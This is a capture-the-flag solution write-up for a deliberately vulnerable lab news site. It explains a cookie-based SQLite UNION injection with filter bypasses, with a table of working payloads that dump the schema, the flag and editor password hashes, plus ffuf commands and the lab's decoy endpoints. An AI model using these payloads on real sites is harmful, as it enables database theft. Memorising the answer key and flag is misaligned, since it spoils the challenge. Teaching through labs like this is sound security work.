# DailyDispatch (`/news/`) - solution notes

- **Difficulty:** Hard
- **Engine:** SQLite 3 (file `lab/data/dailydispatch.db`)
- **Technique:** cookie-based SQL injection (UNION, in-band) with whitespace + keyword filtering to bypass
- **Flag table:** `wire_services` (flag is in `api_key`, provider "Photo Archive")

No accounts, logins or API keys exist. The only cookie is `dd_prefs`, set by the site on the first visit.

## Where the injection is

Cookie `dd_prefs` (Path=/news) holds `urlsafe_base64(JSON)`, e.g. `{"ed":"intl","dm":"standard"}`. The `ed` (edition) value is concatenated into the home page query that feeds the sidebar block "Top stories for your edition":

`SELECT id, title, summary, category, published FROM articles WHERE edition = '<ed>' ORDER BY published DESC LIMIT 6`

Five columns; the sidebar shows title (col 2), category (col 4) and published (col 5), and the id (col 1) in the link. Errors show only "Top stories are not showing right now."

Filter, applied to `ed` after base64 + JSON decoding:
1. If it contains a space, tab, CR or LF, the value is discarded and the default edition is used (silently).
2. Otherwise the words `union`, `select`, `from`, `where` are removed once, case-insensitively (single pass, not recursive).

## How a tester finds it

- Look at the `Set-Cookie` header on the first response, decode the `dd_prefs` value (base64 -> JSON). Changing `dm` is validated; changing `ed` changes the sidebar (`us`, `uk`, `eu`, `asia`). The edition selector in the nav bar sets the same cookie (whitelisted at set time only).
- A quote in `ed` breaks the sidebar ("not showing right now"), proving injection. Spaces are silently ignored (fallback), and UNION/SELECT keywords vanish.
- Bypasses: nest the keywords (`UNUNIONION`, `SELSELECTECT`, `FRFROMOM`, `WHWHEREERE`), and replace whitespace with `/**/` or with a form feed written as the JSON escape `\u000c` (SQLite treats form feed as whitespace; the check runs after decoding but only looks for space/tab/CR/LF). End with `--`.

## Exploitation

Build the JSON `{"ed":"<payload>","dm":"standard"}`, base64-url encode it, send as the `dd_prefs` cookie to `/news/`, read the sidebar. Payloads (`/**/` stands in for whitespace):

| Goal | `ed` value |
|---|---|
| Version | `x'/**/UNUNIONION/**/SELSELECTECT/**/1,sqlite_version(),3,4,5--` |
| Tables | `x'/**/UNUNIONION/**/SELSELECTECT/**/1,group_concat(name),3,4,5/**/FRFROMOM/**/sqlite_master/**/WHWHEREERE/**/type='table'--` |
| Columns | `x'/**/UNUNIONION/**/SELSELECTECT/**/1,group_concat(name),3,4,5/**/FRFROMOM/**/pragma_table_info('wire_services')--` |
| Columns (CREATE statement) | `...1,sql,3,4,5/**/FRFROMOM/**/sqlite_master/**/WHWHEREERE/**/name='wire_services'--` |
| Rows + flag | `x'/**/UNUNIONION/**/SELSELECTECT/**/1,group_concat(provider\|\|':'\|\|api_key,'\|'),3,4,5/**/FRFROMOM/**/wire_services--` |
| Editors (credential-like rows) | `...1,group_concat(username\|\|':'\|\|password_hash,'\|'),3,4,5/**/FRFROMOM/**/editors--` |

(`\|` is table escaping: the real characters are `||` and `'|'`.)

SQLite notes: no `information_schema` and no `version()`; use `sqlite_version()`, `sqlite_master`, `pragma_table_info()`, `group_concat()`, `||`. The table list also contains `sqlite_sequence`.

Flag: `FLAG{dailydispatch_copper_heron_58bd}`

## Tables
`editors` (username + password_hash), `categories`, `articles`, `subscribers`, `ad_campaigns`, `messages` (decoys), `wire_services` (flag), plus `sqlite_sequence`.

## Hidden pages (found by ffuf, safe decoys)

Not linked from any page, not in robots/sitemap:
- `/news/popular?section=<category slug>` - slug looked up with a bound parameter; unknown slug gives "No match".
- `/news/weekly?issue=<1-53>` - digits only, bound.

Find them with:
- `ffuf -u http://HOST:PORT/news/FUZZ -w /usr/share/wordlists/dirb/common.txt` (or `raft-small-words.txt`): unknown paths are 404, `popular` and `weekly` are 200.
- Parameter names: `ffuf -u 'http://HOST:PORT/news/popular?FUZZ=world' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size of /news/popular>` finds `section`; the same with `/news/weekly?FUZZ=44` finds `issue`.

They are red herrings: neither reads the cookie and both use bound parameters. The real injection is the cookie.

## Rabbit holes (all safe)

Visible, linked from the HTML:
- `/news/section?cat=` - bound parameter; a quote gives "No such section".
- `/news/article?id=` - digits only, bound.
- `/news/search?q=` - quotes, semicolons and backslashes are rejected ("unsupported characters"); the rest is a bound LIKE.
- `/news/archive?year=` - four digits only, bound.
- `/news/author?name=` - bound parameter.
- `/news/feed.xml?cat=` - bound parameter.
- The `dm` field inside `dd_prefs`: whitelist (standard / compact / large).
- Only the home page reads the edition from the cookie; every other page ignores it.
- Contact and subscribe forms: parameterised inserts, output escaped.
- Dead ends: `/news/admin`, `/news/backup.zip`, `/news/db.sqlite` (static 403), `/news/old` (static page).
